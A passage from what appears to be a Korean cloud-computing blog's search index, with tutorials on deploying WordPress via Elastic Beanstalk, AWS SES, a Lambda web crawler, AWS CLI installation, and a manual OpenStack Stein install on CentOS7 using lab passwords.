설정을 진행으르 진행 후, 네트워크 설정을 진행합니다. 네트워크 및 데이터베이스에 대한 설정은 [EC2 동적 사이트 구축) (https://mung0001.github.io/docs/cloudcomputing/awstraining/ec2site/)의 VPC 및 보안그룹을 사용하였습니다.      설정이 완료되면 다시 위로 올라와 인스턴스의 보안그룹과 키 페어를 등록합니다. 설정이 완료되면 앱 생성을 클릭하여 ElasticBeanstalk를 생성합니다.      위의 그림과 설치가 완료되면 EC2, RDS등이 설치된 것을 확인 할 수 있습니다. 다음으로는 Elastic Beanstalk의 URL를 통해 http://[ 생성한 애플리케이션 URL ]/wordpress로 진입합다.      WordPress가 설치된 것을 확인할 수 있습니다.      위의 그림과 같이 설정을 진행합니다. ElasticBeanstalk에 의해 생성된 db의 이름은 기본적으로 ebdb로 생성되어 있습니다. 데이터베이스의 호스트는 생성된 RDS의 EndPorint를 설정합니다.      다음의 웹 사이트 이름, 관리자의 대한 추가 설정을 마치면 WordPress의 생성이 완료되었습니다.    이와 같이 ElasticBeanstalk를 사용하면 AWS의 다양한 서비스와 PIP 뿐만이 아닌, 다양한 패키지들을 간단하게 생성이 가능합니다.     Elastic Beanstalk의 eb ( awsebcli ) 활용   eb 명령어는 Elastic Beanstalk 전용 CLI로, AWS CLI와 별도로 설치가 필요합니다.     $ pip install awsebcli\r# awsebcli 설치\r$ eb --version\r$ awsebcli 설치확인\r awsebcli를 설치합니다.     $ cd /[ WordPress 압축 푼 파일 경로 ]\r$ eb init -p php\r# php 플랫폼 지정\r 다운 받은 WordPress의 압축을 해제하고, 해당 디렉토리를 플랫폼으로 지정합니다.     $ eb create [ RDS 이름 ] --database --timoute 30\r# eb 애플리케이션에 사용할 RDS 생성\r RDS를 생성합니다.     define(\u0026#39;DB_NAME\u0026#39;, $_SERVER[\u0026#39;RDS_DB_NAME\u0026#39;]);\rdefine(\u0026#39;DB_USER\u0026#39;, $_SERVER[\u0026#39;RDS_USERNAME\u0026#39;]);\rdefine(\u0026#39;DB_PASSWORD\u0026#39;, $_SERVER[\u0026#39;RDS_PASSWORD\u0026#39;]);\rdefine(\u0026#39;DB_HOST\u0026#39;, $_SERVER[\u0026#39;RDS_HOSTNAME\u0026#39;]);\rdefine(\u0026#39;FORCE_SSL_LOGIN\u0026#39;, true);\rdefine(\u0026#39;FORCE_SSL_ADMIN\u0026#39;, true);\r 압축을 해제한 WordPress 디렉토리 내의 wp-config-ample.php를 복사해서 wp-config.php를 생성 후, wp-config파일을 수정합니다. 위와 동일하게 wp-includes/functions.php 또한 수정합니다.     "});index.add({'id':127,'href':'/docs/cloudcomputing/awstraining/ses/','title':"AWS SES 메일 시스템 구축",'content':"AWS SES 메일 시스템 구축    이번 장에서는 SES로 메일을 전송하는 시스템을 구축하여 보겠습니다. 단, SES 사용을 위해서는 버지나이 북부, 오레곤, 아일랜드만이 사용이 가능합니다.    메일 시스템 구축 순서\n1. Simple Email Service ( SES ) 사용\n2. EC2 인스턴스로 메일 서버를 구축\n3. 서드 파티 도구를 사용\n   AWS SES 메일 시스템 구축      먼저, SES 서비스를 이용하기 위해 AWS에서 SES를 검색합니다.      Email Addresses \u0026gt; Verify a New Email Address를 클릭하여 인증을 진행합니다. 사용하실 메일주소를 입력 후, 인증을 진행합니다.      사용하실 메일로 접속하여 인증을 진행하면, 다음과 같이 verified 항목이 체크됩니다.      확인을 위해 등록하신 메일주소를 체크하고 상단의 Send a Test Email을 클릭합니다.      값을 입력하고 이메일을 발송합니다.      메일주소로 접속하면, 메일이 도착한 것을 확인할 수 있습니다.      좌측 메뉴의 Sending Statistics를 클릭하면 현재 메일 사용량과 제한을 알 수 있습니다. 또한 현재 그림에는 보이지 않지만 상단의 Request a Sending Limit Increase를 클릭하면 허용량을 증가시키는 것이 가능합니다. 단, 신청 시, 완료까지 평균적으로 1일의 시간이 소요됩니다.      메일함 완성 후에 업데이트 예정                          예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다. \r\r\r\r "});index.add({'id':128,'href':'/docs/cloudcomputing/awstraining/aws-lambda-crawling/','title':"AWS Lambda Crawling",'content':"AWS Lambda Crawling    AWS Lambda Crawling                     $ pip3 install [ Package ] -t .\r$ pip3 install bs4 -t .\r$ \u0026#39;[ 7z 경로, 다른 zip도 가능 ]\u0026#39; a \u0026#39;[ 압축할 패키지 이름 ]\u0026#39; \u0026#39;[ 압축할 패키지 경로 ]\u0026#39; $ \u0026#39;C:\\Program Files\\7-Zip\\7z.exe\u0026#39; a \u0026#39;C:\\AWSLambda\\bs4.zip\u0026#39; \u0026#39;.\u0026#39;\r                                                                                     예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다. \r\r\r\r import json import urllib.request from bs4 import BeautifulSoup def lambda_handler(event, context): url = \u0026ldquo;https://www.google.com\u0026rdquo; soup = BeautifulSoup(urllib.request.urlopen(url).read(), \u0026ldquo;html.parser\u0026rdquo;) a_tags = soup.find_all(\u0026ldquo;a\u0026rdquo;) result_list = [] for i in a_tags: result_list.append(i.get_text()) return { \u0026lsquo;statusCode\u0026rsquo;: 200, \u0026lsquo;body\u0026rsquo;: json.dumps(result_list) }\n"});index.add({'id':129,'href':'/docs/cloudcomputing/%EC%A0%95%EB%A6%AC%EC%A0%84/aws_cli/','title':"AWS CLI",'content':"AWS CLI   Amazon Web Service Command Line Interface  AWS CLI    AWS CLI란 AWS의 서비스들을 명령어로 조작할 수 있게 해주는 통합 툴입니다.\n  다양한 운옃제에서 지원하며, 파이썬 프로그래밍 언어인 AWS SDK인 boto를 기반으로 만들어져 있습니다.\n  AWS CLI로 사용할 수 있는 AWS 서비스는 AWS CLI에서 확일할 수 있습니다.\n  기본적으로 AWS 매니지먼트 콘솔과 거의 같은 조작이 가능하며, 콘솔화면에서 할 수 있는 조작을 프로그램으로 만들어 배치 ( barch )로 만들면 AWS 서비스를 보다 쉽게 사용이 가능합니다.\n     AWS CLI 설치   그러면 다음으로는 AWS CLI 설치방법에 대해 알아보도록 하겠습니다.   MAC OS   MAC 설치를 위해서는 Homebrew가 미리 설치되어 있어야 합니다.\n  Homebrew 설치는 Homebrew 설치를 참고해주세요.\n   $ sudo brew install python\r$ sudo easy_install pip\r$ pip install awscli\r# 설치\r$ aws --version\r# 확인\r$ pip install -U awscli\r# 업데이트\r Linux 설치   레드햇 계열  $ sudo yum install python-setuptools\r$ sudo easy_install pip\r$ sudo pip install pip\r# 설치\r$ aws --version\r# 확인\r$ pip install -U awscli\r# 업데이트\r  데비안 계열  $ sudo apt install python\r$ sudo easy_install pip\r$ sudo pip install pip\r# 설치\r$ aws --version\r# 확인\r$ pip install -U awscli\r# 업데이트\r Window 설치   다운로드 링크 : 64bit 다운로드 링크 : 32bit    powershell or cmd 창을 실행 후  aws --version\r# 확인\r"});index.add({'id':130,'href':'/docs/cloudcomputing/%EC%A0%95%EB%A6%AC%EC%A0%84/aws_sdk/','title':"AWS SDK",'content':"AWS SDK   AWS SDK  AWS SDK "});index.add({'id':131,'href':'/docs/cloudcomputing/openstacktraining/openstack-stein/','title':"Openstack Stain Manual 설치",'content':"Openstack Stain Manual 설치    1. 시스템 및 네트워크 구성   여기서는 Nat 네트워크를 외부, host1 대역을 내부로 사용하여 Openstack을 구축해보도록 하겠습니다.    운영체제 및 네트워크 구성  Hypervisor : Vmware Workstation 15 OS : CentOS7      노드 구성     OS Hostname Network Interface Network Interface2 CPU RAM DISK     CentOS7 controller Nat ( 192.168.10.100 ) HOST1 ( 10.10.10.10 ) 2cpu 4thread 8 RAm 30G   CentOS7 natwork Nat ( 192.168.10.101 ) HOST1 ( 10.10.10.20 ) 1cpu 2thread 2 RAm 20G   CentOS7 compute Nat ( 192.168.10.102 ) HOST1 ( 10.10.10.30 ) 1cpu 4thread 4 RAm 100G      기본적인 업데이트 및 설정을 모든 노드에 진행합니다.  $ yum -y update\r# 업데이트\r$ vi /etc/hosts\r10.10.10.10 controller\r10.10.10.20 network\r10.10.10.30 compute\r# known host 등록\r  설정이 완료되면 기본 구성을 모든 노드에 진행합니다.  $ yum -y install chrony\r# 시간 동기화를 위한 chrony 설치\r$ vi /etc/chrony.conf\r#server 0.centos.pool.ntp.org iburst\r#server 1.centos.pool.ntp.org iburst\r#server 2.centos.pool.ntp.org iburst\r#server 3.centos.pool.ntp.org iburst\rserver ntp1.jst.mfeed.ad.jp iburst\rserver ntp2.jst.mfeed.ad.jp iburst\rserver ntp3.jst.mfeed.ad.jp iburst\rallow 10.10.10.0/24\r# 시간동기화\r$ firewall-cmd --add-service=ntp --permanent\r$ firewall-cmd --reload\r# ntp 방화벽 허용 및 리로딩\r$ init 6\r# 시스템 재시작\r$ chronyc sources\r# 확인\r   2. Openstack 기본 패키지 구성   Openstack의 기본 패키지 구성은 먼저 contorller 노드만을 통해 진행됨을 유의해주시길 바랍니다. controller 노드에는 다음의 패키지가 설치됩니다.  MariaDB: OpenStack 서비스 및 VM 관련 설정들을 보관하기 위해 사용 RabbitMQ: OpenStack 서비스 간 상호 메시지를 주고 받기 위하나 메시지 큐로 사용 Memcached: 범용 분산 메모리 캐시 시스템으로, 자주 외부 데이터에 접근해야 하는 경우에 발생하는 오버헤드를 줄이기 위해 메모리르르 캐싱하고 읽어들이는 역할을 담당, OpenStack 서비스에서는 주로 인증 메커니즘에서 토큰 캐싱을 위해 사용됩니다.      Openstack 패키지 설치 및 레포지토리 구성  $ yum -y install centos-release-openstack-stein\r$ sed -i -e \u0026#34;s/enabled=1/enabled=0/g\u0026#34; /etc/yum.repos.d/CentOS-OpenStack-stein.repo\r# stein 패캐지를 등록합니다.\r  MariaDB를 설치합니다.  $ yum --enablerepo=centos-openstack-stein -y install mariadb-server\r$ vi /etc/my.cnf\r[mysqld]\rcharacter-set-server=utf8\r# charset을 utf-8으로 변경합니다\r$ systemctl start mariadb\r$ systemctl enable mariadb\r# mariadb을 시작 및 자동시작을 등록합니다.\r$ mysql_secure_installation\r# 패스워드 설정을 진행합니다.\r$ firewall-cmd --add-service=mysql --permanent\r$ firewall-cmd --reload\r  RabbitMQ 및 Memcached를 설치합니다.  $ yum --enablerepo=centos-openstack-stein -y install rabbitmq-server\r$ yum --enablerepo=centos-openstack-stein -y install memcached\r$ vi /etc/my.cnf.d/mariadb-server.cnf\r[mysqld]\r...\rcharacter-set-server=utf8\rmax_connections=500\r# Mariadb의 위에 내용을 추가합니다.\r$ vi /etc/sysconfig/memcached\rOPTIONS=\u0026#34;-l 0.0.0.0,::\u0026#34;\r# mamcached를 모든 리스닝 상태로 전환시킵니다.\r$ systemctl restart mariadb rabbitmq-server memcached\r$ systemctl enable mariadb rabbitmq-server memcached\r# Mariadb와 함께 RabbitMQ 및 Memcached를 시작 및 자동시작을 등록합니다.\r$ rabbitmqctl add_user [ id ] [ pw ]\r# rabbitmq 유저를 생성합니다. 여기서는 openstack/qwer1234를 사용하도록 하겠습니다.\r$ rabbitmqctl set_permissions [ id ] \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34;\r# 생성한 사용자에게 모든 권한을 부여합니다.\r$ firewall-cmd --add-port={11211/tcp,5672/tcp} --permanent\r$ firewall-cmd --reload\r   3. Keystone ( 인증 서비스 ) 구성   Keystone 또한 controller의 설치를 진행합니다. keystone에 대한 설명은 keystone을 참조해주세요.    keyston DB 생성  $ mysql -u root -p\rMariaDB [(none)]\u0026gt; create database keystone;\rMariaDB [(none)]\u0026gt; grant all privileges on keystone.* to keystone@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on keystone.* to keystone@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; flush privileges;\r# keystone 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )\r  keystone 패키지 설치 및 수정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-keystone openstack-utils python-openstackclient httpd mod_wsgi\r# keystone 및 관련 패키지를 설치합니다.\r$ vi /etc/keystone/keystone.conf\r[cache]\r...\rmemcache_servers = controller:11211\r[database]\r...\rconnection = mysql+pymysql://keystone:qwer1234@controller/keystone\r[token]\r...\rprovider = fernet\r# keystone 구성을 위해 설정파일 수정합니다.\r# hosts에 등록한 IP 혹은 controller의 IP를 기입하셔도 무관합니다.\r$ su -s /bin/bash keystone -c \u0026#34;keystone-manage db_sync\u0026#34;\r# 설정 값을 토대로 db의 설정을 저정합니다.\r$ keystone-manage fernet_setup --keystone-user keystone --keystone-group keystone\r$ keystone-manage credential_setup --keystone-user keystone --keystone-group keystone\r# 토큰 및 자격 증명 암호화를 위해 사용되는 키 저장소를 생성합니다.\r$ export controller=10.10.10.10\r$ keystone-manage bootstrap --bootstrap-password qwer1234 \\\r--bootstrap-admin-url http://$controller:5000/v3/ \\\r--bootstrap-internal-url http://$controller:5000/v3/ \\\r--bootstrap-public-url http://$controller:5000/v3/ \\\r--bootstrap-region-id RegionOne\r# controlelr의 IP로 keystone을 부트스트랩합니다.\r$ setsebool -P httpd_use_openstack on\r$ setsebool -P httpd_can_network_connect on\r$ setsebool -P httpd_can_network_connect_db on\r$ firewall-cmd --add-port=5000/tcp --permanent\r$ firewall-cmd --reload\r# Selinux와 방화벽으르 설정합니다.\r$ ln -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/\r$ systemctl start httpd\r$ systemctl enable httpd\r# keystone 설정 활성화 및 httpd 를 시작합니다.\r  정상 동작 확인을 위한 토큰 파일 생성  $ vi ~/admin\rexport OS_PROJECT_DOMAIN_NAME=default\rexport OS_USER_DOMAIN_NAME=default\rexport OS_PROJECT_NAME=admin\rexport OS_USERNAME=admin\rexport OS_PASSWORD=qwer1234\rexport OS_AUTH_URL=http://controller:5000/v3\rexport OS_IDENTITY_API_VERSION=3\rexport OS_IMAGE_API_VERSION=2\r$ chmod 600 ~/admin\r$ source ~/admin\r  project 생성  $ cd ~\r$ . admin\r$ openstack project create --domain default --description \u0026#34;Service Project\u0026#34; service\r+-------------+----------------------------------+\r| Field | Value |\r+-------------+----------------------------------+\r| description | Service Project |\r| domain_id | default |\r| enabled | True |\r| id | 3f0b3ef5b8c94a0a9cca8e34ea2fdbd6 |\r| is_domain | False |\r| name | service |\r| parent_id | default |\r| tags | [] |\r+-------------+----------------------------------+\r# project 생성\r$ openstack project list\r+----------------------------------+---------+\r| ID | Name |\r+----------------------------------+---------+\r| 3f0b3ef5b8c94a0a9cca8e34ea2fdbd6 | service |\r| ec1a4336cfa64d04bbc8f908b26a6cda | admin |\r+----------------------------------+---------+\r  이것으로 keystone에 대한 설치가 끝났습니다. 혹시 오류가 발생할 경우 /var/log/keystone/ 혹은 /var/log/httpd/에서 error 로그, keystone 로그를 검색하여 오류를 찾아내시면 보다 쉽게 문제를 해결하실 수 있습니다.     4. Glance ( 이미지 서비스 ) 구성   Glance 또한 controller에서만 설치를 진행합니다. 에 대한 설명은 Glance을 참조해주세요.    glance 사용자 추가  $ source ~/admin\r# 전에 생성했던 토큰 값을 적용합니다.\r$ openstack user create --domain default --project service --password qwer1234 glance\r# glance 게정을 추가합니다.\r$ openstack role add --project service --user glance admin\r# glance에 admin의 권한을 부여합니다.\r$ openstack service create --name glance --description \u0026#34;OpenStack Image service\u0026#34; image\r# glance 서비스 엔트리를 생성합니다.\r$ export controller=10.10.10.10\r$ openstack endpoint create --region RegionOne image public http://$controller:9292\r$ openstack endpoint create --region RegionOne image internal http://$controller:9292\r$ openstack endpoint create --region RegionOne image admin http://$controller:9292\r# glance 서비스의 endpoint를 추가합니다 ( public, internal, admin )\r$ openstack user list\r+----------------------------------+--------+\r| ID | Name |\r+----------------------------------+--------+\r| bd36365f2459468a9c480cb48bab3ac0 | glance |\r| e19db9d5ec2c4c30b7a85d18b8b0e589 | admin |\r+----------------------------------+--------+\r$ openstack endpoint list\r+----------------------------------+-----------+--------------+--------------+---------+-----------+-----------------------------+\r| ID | Region | Service Name | Service Type | Enabled | Interface | URL |\r+----------------------------------+-----------+--------------+--------------+---------+-----------+-----------------------------+\r| 00b38774cef048ee9950eda6938accc3 | RegionOne | keystone | identity | True | public | http://10.10.10.10:5000/v3/ |\r| 4591b06391374fe888380fa23b8f5121 | RegionOne | glance | image | True | admin | http://10.10.10.10:9292 |\r| 53dd31fecf2d44949c141149a13c673b | RegionOne | keystone | identity | True | admin | http://10.10.10.10:5000/v3/ |\r| 555f3d900f7e416bb783120f7ce74fe8 | RegionOne | glance | image | True | internal | http://10.10.10.10:9292 |\r| 5b3ac620bb7d4d9aabdf0f33229ee346 | RegionOne | glance | image | True | public | http://10.10.10.10:9292 |\r| bdd7df7c8cba46f6ada2c12155a9f1d6 | RegionOne | keystone | identity | True | internal | http://10.10.10.10:5000/v3/ |\r+----------------------------------+-----------+--------------+--------------+---------+-----------+-----------------------------+\r Glance DB 생성  $ mysql -u root -p\rMariaDB [(none)]\u0026gt; create database glance;\rMariaDB [(none)]\u0026gt; grant all privileges on glance.* to glance@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on glance.* to glance@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; flush privileges;\r# 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )\r  glance 패키지 설치 및 수정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-glance\r# glance 패키지를 설치합니다.\r$ vi /etc/glance/glance-api.conf\r[DEFAULT]\rbind_host = 0.0.0.0\r[glance_store]\rstores = file,http\rdefault_store = file\rfilesystem_store_datadir = /var/lib/glance/images/ # 이미지 경로 지정\r[database] # database 연동\rconnection = mysql+pymysql://glance:qwer1234@controller/glance\r[keystone_authtoken] # keystone 인증\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = glance\rpassword = qwer1234\r[paste_deploy]\rflavor = keystone\r# glance.conf를 수정합니다.\r$ su -s /bin/bash glance -c \u0026#34;glance-manage db_sync\u0026#34;\r# glance db를 동기화 시킵니다.\r$ systemctl start openstack-glance-api\r$ systemctl enable openstack-glance-api\r# glance를 시작 및 실행시 자동시작을 등록합니다.\r$ setsebool -P glance_api_can_network on\r$ firewall-cmd --add-port=9292/tcp --permanent\r$ firewall-cmd --reload\r# Selinux 및 firewall을 설정합니다.\r  확인을 위한 이미지 생성  $ wget http://download.cirros-cloud.net/0.5.1/cirros-0.5.1-x86_64-disk.img\r# 확인을 위해 cirros 이미지를 다운 받습니다.\r$ openstack image create \u0026#34;Cirros\u0026#34; --file cirros-0.5.1-x86_64-disk.img --disk-format qcow2\r# image 등록\r$ openstack image list\r+--------------------------------------+--------+--------+\r| ID | Name | Status |\r+--------------------------------------+--------+--------+\r| 38e15009-022b-49ce-bcdf-b220eb3c5b12 | Cirros | active |\r+--------------------------------------+--------+--------+\r# 확인\r   5. Nova ( 컴퓨트 서비스 ) 구성   Nova 서비스는 controller 노드와 compute노드에 구성됩니다. 설치는 contoller \u0026gt; compute 순으로 진행하도록 하겠습니다. Nova에 대한 설명은 Nova을 참조해주세요.    Nova, Placement 추가 및 등록  $ source ~/admin\r$ openstack user create --domain default --project service --password qwer1234 nova\r$ openstack role add --project service --user nova admin\r$ openstack user create --domain default --project service --password qwer1234 placement\r$ openstack role add --project service --user placement admin\r# nova 유저와 placement유저를 생성합니다.\r$ openstack service create --name nova --description \u0026#34;OpenStack Compute Service\u0026#34; compute\r# nova 서버 엔트리 저장\r$ openstack service create --name placement --description \u0026#34;OpenStack Compute Placement Service\u0026#34; placement\r# placement 서버 엔트리 저장\r$ openstack user list\r# 확인\r+----------------------------------+-----------+\r| ID | Name |\r+----------------------------------+-----------+\r| 18bdf3e68a754aa182f93196a918ba65 | nova |\r| 18ff8b52493a408d9933596ed20cca9c | glance |\r| bfd0cf6d358e49bf88f183a463c689a2 | placement |\r| e19db9d5ec2c4c30b7a85d18b8b0e589 | admin |\r+----------------------------------+-----------+\r$ export controller=10.10.10.10\r$ openstack endpoint create --region RegionOne compute public http://$controller:8774/v2.1/%\\(tenant_id\\)s\r$ openstack endpoint create --region RegionOne compute internal http://$controller:8774/v2.1/%\\(tenant_id\\)s\r$ openstack endpoint create --region RegionOne compute admin http://$controller:8774/v2.1/%\\(tenant_id\\)s\r# nova 서비스의 endpoint를 추가합니다\r$ openstack endpoint create --region RegionOne placement public http://$controller:8778\r$ openstack endpoint create --region RegionOne placement internal http://$controller:8778\r$ openstack endpoint create --region RegionOne placement admin http://$controller:8778\r$ placement의 endpoint를 추가합니다.\r$ openstack endpoint list\r# 확인\r-------+-----------+--------------------------------------------+\r| ID | Region | Service Name | Service Type | Enabled | Interface | URL |\r+----------------------------------+-----------+--------------+--------------+---------+-----------+--------------------------------------------+\r| 00b38774cef048ee9950eda6938accc3 | RegionOne | keystone | identity | True | public | http://10.10.10.10:5000/v3/ |\r| 04ca5fb6701348089777d68a68ca7cd2 | RegionOne | placement | placement | True | public | http://10.10.10.10:8778 |\r| 53ad55ce8897463b86ea616a8ba64d95 | RegionOne | glance | image | True | public | http://10.10.10.10:9292 |\r| 53dd31fecf2d44949c141149a13c673b | RegionOne | keystone | identity | True | admin | http://10.10.10.10:5000/v3/ |\r| 595a2045543b42c2bb6f23e2dd30a3bb | RegionOne | glance | image | True | internal | http://10.10.10.10:9292 |\r| 6820b49138d54b63ac34cd52f1be08f6 | RegionOne | placement | placement | True | internal | http://10.10.10.10:8778 |\r| 6ad740445fca4a0fb684d913909fe129 | RegionOne | nova | compute | True | admin | http://10.10.10.10:8774/v2.1/%(tenant_id)s |\r| 9863826e093943cf97a05dfc6e3c159a | RegionOne | nova | compute | True | internal | http://10.10.10.10:8774/v2.1/%(tenant_id)s |\r| b9f9701a57ec40e487ce493a63903cae | RegionOne | placement | placement | True | admin | http://10.10.10.10:8778 |\r| bd787b85b3124f0ab15854998624cb19 | RegionOne | nova | compute | True | public | http://10.10.10.10:8774/v2.1/%(tenant_id)s |\r| bdd7df7c8cba46f6ada2c12155a9f1d6 | RegionOne | keystone | identity | True | internal | http://10.10.10.10:5000/v3/ |\r| d394eaf13ac840b3b2e69e074c2c1c20 | RegionOne | glance | image | True | admin | http://10.10.10.10:9292 |\r+----------------------------------+-----------+--------------+--------------+---------+-----------+--------------------------------------------+\r  Nova DB 생성  $ mysql -u root -p\rMariaDB [(none)]\u0026gt; create database nova;\rMariaDB [(none)]\u0026gt; grant all privileges on nova.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on nova.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; create database nova_api;\rMariaDB [(none)]\u0026gt; grant all privileges on nova_api.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on nova_api.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; create database nova_placement;\rMariaDB [(none)]\u0026gt; grant all privileges on nova_placement.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on nova_placement.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; create database nova_cell0;\rMariaDB [(none)]\u0026gt; grant all privileges on nova_cell0.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on nova_cell0.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; flush privileges;\r# nova 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )\r  nova 서비스를 설치 및 수정합니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-nova\r# nova 패키지를 설치합니다.\r$ vi /etc/nova/nova.conf\r[DEFAULT]\rmy_ip = 10.10.10.10\rstate_path = /var/lib/nova\renabled_apis = osapi_compute,metadata\rlog_dir = /var/log/nova\r[api]\rauth_strategy = keystone\r[glance]\rapi_servers = http://controller:9292\r[oslo_concurrency]\rlock_path = $state_path/tmp\r[api_database]\rconnection = mysql+pymysql://nova:qwer1234@controller/nova_api\r[database]\rconnection = mysql+pymysql://nova:qwer1234@controller/nova\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = nova\rpassword = qwer1234\r[placement]\rauth_url = http://controller:5000\ros_region_name = RegionOne\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = placement\rpassword = qwer1234\r[placement_database]\rconnection = mysql+pymysql://nova:qwer1234@controller/nova_placement\r[wsgi]\rapi_paste_config = /etc/nova/api-paste.ini\r# nova의 설정 파일을 수정합니다.\r  Selinux 및 firewalld을 설정합니다.  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux\r$ semanage port -a -t http_port_t -p tcp 8778\r$ firewall-cmd --add-port={6080/tcp,6081/tcp,6082/tcp,8774/tcp,8775/tcp,8778/tcp} --permanent\r$ firewall-cmd --reload\r  nova 서비스를 DB에 저장합니다.  $ su -s /bin/bash nova -c \u0026#34;nova-manage api_db sync\u0026#34;\r$ su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 map_cell0\u0026#34;\r$ su -s /bin/bash nova -c \u0026#34;nova-manage db sync\u0026#34;\r$ su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 create_cell --name cell1\u0026#34;\r  nova 서비스를 시작 및 자동시작을 설정합니다.  $ systemctl restart httpd\r$ chown nova. /var/log/nova/nova-placement-api.log\r$ for service in api consoleauth conductor scheduler novncproxy; do\rsystemctl start openstack-nova-$service\rsystemctl enable openstack-nova-$service\rdone\r 이상으로 controller 노드에서의 구성을 마치겠습니다. 하단부터의 패키지 설치는 compute노드에서 진행해주세요      Stein 레포지터리를 활성화합니다.  $ yum -y install centos-release-openstack-stein\r$ sed -i -e \u0026#34;s/enabled=1/enabled=0/g\u0026#34; /etc/yum.repos.d/CentOS-OpenStack-stein.repo\r# stein 패캐지를 등록합니다.\r  KVM 하이퍼바이저를 구성합니다.  $ yum -y install qemu-kvm libvirt virt-install bridge-utils\r# KVM 구성에 필요한 가상화 및 네트워크 도구들을 설치합니다.\r$ lsmod | grep kvm\r# 확인\r$ systemctl start libvirtd\r$ systenctk ebable libvirtd\r  compute 노드에 nova 서비스를 설치 및 수정합니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-nova\r# nova 패키지를 설치합니다.\r$ vi /etc/nova/nova.conf\r[DEFAULT]\rmy_ip = 10.10.10.30\rstate_path = /var/lib/nova\renabled_apis = osapi_compute,metadata\rlog_dir = /var/log/nova\rtransport_url = rabbit://openstack:qwer1234@controller\r[api]\rauth_strategy = keystone\r[vnc]\renabled = True\rserver_listen = 0.0.0.0\rserver_proxyclient_address = 192.168.10.102\rnovncproxy_base_url = http://192.168.10.102/vnc_auto.html\r# vnc 화면으르 활성화 합니다. 추후 오픈스택 대시보드 혹은 vnc 클라이언트 프로그램으로 접속할 때 사용합니다.\r[glance]\rapi_servers = http://controller:9292\r[oslo_concurrency]\rlock_path = $state_path/tmp\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = nova\rpassword = qwer1234\r[placement]\rauth_url = http://controller:5000\ros_region_name = RegionOne\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = placement\rpassword = qwer1234\r[wsgi]\rapi_paste_config = /etc/nova/api-paste.ini\r# nova의 설정 파일을 수정합니다.\r  Selinux 및 firewall 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux\r$ firewall-cmd --add-port=5900-5999/tcp --permanent\r$ firewall-cmd --reload\r  nova 서비스 시작  $ systemctl start openstack-nova-compute\r$ systemctl enable openstack-nova-compute\r\u0026amp; controller# openstack compute service list\r# 확인\r+----+------------------+------------+----------+---------+-------+----------------------------+\r| ID | Binary | Host | Zone | Status | State | Updated At |\r+----+------------------+------------+----------+---------+-------+----------------------------+\r| 4 | nova-consoleauth | controller | internal | enabled | up | 2020-07-19T02:47:16.000000 |\r| 5 | nova-conductor | controller | internal | enabled | up | 2020-07-19T02:47:12.000000 |\r| 8 | nova-scheduler | controller | internal | enabled | up | 2020-07-19T02:47:12.000000 |\r| 9 | nova-compute | compute | nova | enabled | up | 2020-07-19T02:47:08.000000 |\r+----+------------------+------------+----------+---------+-------+----------------------------+\r   6. Neutron ( 네트워크 서비스 ) 구성   Neutron 서비스르르 구성하는 과정에서는 모든 노드에 설치가 진행됩니다. 기본적으로 openvswithch를 중심으로 진행하며, 경우에 따라서는 linuxbridge로 서비스를 대체하는 것이 가능합니다. 설치 과정은 controller, compute, network 노드 순으로 진행하겠습니다. Neutron에 대한 설명은 Neutron을 